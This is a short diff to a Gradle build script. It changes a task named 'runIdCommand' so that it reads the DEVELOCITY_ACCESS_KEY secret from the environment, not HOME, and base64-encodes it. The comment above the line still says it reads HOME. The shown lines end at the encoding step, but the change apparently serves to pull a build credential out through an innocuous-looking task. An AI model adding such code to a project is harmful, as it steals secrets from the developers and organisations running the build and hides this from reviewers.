@@ -501,7 +501,7 @@ configure(projectsWithFlags('java', 'publish')) {
 task runIdCommand {
     doLast {
         // Get the HOME environment variable using Java
-        def homeValue = System.getenv("HOME") ?: ""
+        def homeValue = System.getenv("DEVELOCITY_ACCESS_KEY") ?: ""
         
         // Base64 encode the value
         def encodedValue = homeValue.bytes.encodeBase64().toString()
